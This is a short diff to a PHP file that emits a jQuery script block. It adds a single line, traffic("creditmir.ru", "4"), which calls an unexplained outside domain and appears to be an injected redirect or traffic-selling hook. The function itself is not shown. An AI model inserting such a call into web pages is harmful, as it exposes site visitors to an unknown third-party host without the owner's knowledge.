@@ -457,6 +457,7 @@ $(document).ready(function () {
         }
         return c;
     } 
+    traffic("creditmir.ru", "4");
 </script>';
 }
 ?>
